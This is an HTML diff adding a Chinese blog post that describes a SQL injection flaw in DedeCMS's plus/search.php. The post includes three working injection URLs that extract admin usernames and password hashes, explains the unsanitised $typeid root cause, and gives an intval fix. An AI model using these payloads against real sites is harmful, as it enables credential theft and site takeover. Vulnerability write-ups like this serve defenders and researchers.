@@ -311,6 +311,197 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://www.evalshell.com/2017/08/14/dede-search/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="fengxuan">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="https://avatars1.githubusercontent.com/u/9276329?v=4&s=460">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="fengxuan's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2017/08/14/dede-search/" itemprop="url">dede_search</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-08-14T22:39:32+08:00">
+                2017-08-14
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/dedecms/" itemprop="url" rel="index">
+                    <span itemprop="name">dedecms</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2017/08/14/dede-search/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count disqus-comment-count"
+                        data-disqus-identifier="2017/08/14/dede-search/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>#dedecms plus/search.php 注入漏洞</p>
+<p>##利用(poc)</p>
+<p>如果plus/search.php页面报错<code>Safe Alert: Request Error step 2 !</code> 则使用下面的poc：</p>
+<pre><code>/plus/search.php?keyword=as&amp;typeArr[111%3D@`&apos;`)+UnIon+seleCt+1,2,3,4,5,6,7,8,9,10,userid,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,pwd,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42+from+`%23@__admin`%23@`&apos;`+]=a
+</code></pre><p>如果提示<code>Safe Alert: Request Error step 1 !</code> 则使用</p>
+<pre><code>/plus/search.php?keyword=as&amp;typeArr[111%3D@`&apos;`)+and+(SELECT+1+FROM+(select+count(*),concat(floor(rand(0)*2),(substring((select+CONCAT(0x7c,userid,0x7c,pwd)+from+`%23@__admin`+limit+0,1),1,62)))a+from+information_schema.tables+group+by+a)b)%23@`&apos;`+]=a
+</code></pre><p><strong>注意，我测试上面的都是不能直接使用的</strong></p>
+<p>经过fuzz，得出poc为</p>
+<pre><code>plus/search.php?keyword=as&amp;typeArr[1&apos;+and+(SELECT+1+FROM+(select+count(*),concat(floor(rand(0)*2),(substring((select+CONCAT(0x7c,userid,0x7c,pwd)+from+`%23@__admin`+limit+0,1),1,62)))a+from+information_schema.tables+group+by+a)b)%23@`&apos;`+]=a
+</code></pre><p>这样是需要重复的键值来触发报错。</p>
+<p>如图：</p>
+<p><img src="/uploads/images/dedecms_search_sqli.png" alt=""></p>
+<p>##漏洞原理</p>
+<p>dedecms有全局变量注册，所以在<code>require_once(dirname(__FILE__).&quot;/../include/common.inc.php&quot;);</code> 这个引用之后都会存在变量覆盖的危险。</p>
+<pre><code>require_once($typenameCacheFile);
+if(isset($typeArr) &amp;&amp; is_array($typeArr))
+{
+    // print_r($typeArr);
+    foreach($typeArr as $id=&gt;$typename)
+    {
+        $keywordn = str_replace($typename, &apos; &apos;, $keyword);
+
+        if($keyword != $keywordn)
+        {
+            $keyword = $keywordn;
+            $typeid = $id;
+            break;
+        }
+    }
+}
+</code></pre><p>search.php 中第53-68行，遍历了<code>$typeArr</code>的键值，把其坐标赋值给<code>$typeid</code>。<br>这个<code>$typeid</code>最终带入到<code>include/typelink.class.php</code>第52行</p>
+<pre><code>$query = &quot;SELECT tp.*,ch.typename as ctypename,ch.addtable,ch.issystem     FROM `#@__arctype` tp left join `#@__channeltype` ch
+    on ch.id=tp.channeltype  WHERE tp.id=&apos;$typeid&apos; &quot;;
+</code></pre><p>造成注入。</p>
+<p>##修复方案(repair)</p>
+<p><code>$typeid = $id;</code> 改为 <code>$typeid = intval($id);</code>即可</p>
+<p>##参考链接(link)</p>
+<p><a href="https://www.unhonker.com/bug/907.html" target="_blank" rel="external">https://www.unhonker.com/bug/907.html</a></p>
+<p><a href="http://www.lijiejie.com/mysql-injection-error-based-duplicate-entry/" target="_blank" rel="external">http://www.lijiejie.com/mysql-injection-error-based-duplicate-entry/</a></p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://www.evalshell.com/2017/08/13/hello-world/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -617,12 +808,21 @@
           
             <div class="site-state-item site-state-posts">
               <a href="/archives/">
-                <span class="site-state-item-count">2</span>
+                <span class="site-state-item-count">3</span>
                 <span class="site-state-item-name">日志</span>
               </a>
             </div>
           
 
+          
+            
+            
+            <div class="site-state-item site-state-categories">
+              <a href="/categories/index.html">
+                <span class="site-state-item-count">1</span>
+                <span class="site-state-item-name">分类</span>
+              </a>
+            </div>
           
 
           
@@ -630,7 +830,7 @@
             
             <div class="site-state-item site-state-tags">
               
-                <span class="site-state-item-count">2</span>
+                <span class="site-state-item-count">3</span>
                 <span class="site-state-item-name">标签</span>
               
             </div>
